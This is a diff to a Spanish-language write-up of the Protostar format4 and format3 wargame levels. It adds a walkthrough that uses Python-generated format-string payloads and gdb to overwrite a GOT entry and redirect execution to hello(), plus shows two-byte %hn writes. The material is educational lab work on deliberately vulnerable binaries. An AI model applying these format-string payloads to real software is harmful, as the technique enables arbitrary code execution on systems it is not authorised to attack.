@@ -373,6 +373,27 @@ Continuing.
 (gdb) x/x 0x8049724 -> Pero ahora en vez de eso tenemos que en la GOT hemos escrito "0x4"
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
 ```
+
+## Expotación manual: 
+Vamos a explotarla de una manera muy similar a format3 
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%4$n")' > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
+(gdb) break * 0x0804850f
+(gdb) run < /tmp/pattern
+(gdb) x/x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
+(gdb) p &hello
+$1 = (void (*)(void)) 0x80484b4 <hello>
+(gdb) p 0x80484b4 - 0x00000004
+$2 = 134513840
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08" + "%134513840x%4$n")' | ./format4
+Se ha tirado un buen rato escribiendo lineas vacias en la pantalla, pero al fin...     
+     200
+code execution redirected! you win
+```
+
+## Expotación de 2 bytes: 
 Vamos a escribir de dos en dos bytes, para ello la memoria es la original mas otra que suma 2 -> "0x8049724 y 0x8049726"
 \x24\x97\x04\x08\x26\x97\x04\x08\. 
 
@@ -411,7 +432,7 @@ $1 = 21820
 target is 55445544 :(
 ```
 
-Nos hemos pasado de largo. Pero no ahy que asustarse, hay solución. Simplemente hay que modificar un poco la técncia.
+Nos hemos pasado de largo. Pero no ahy que asustarse, hay solución. Simplemente hay que modificar un poco la técnica.
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
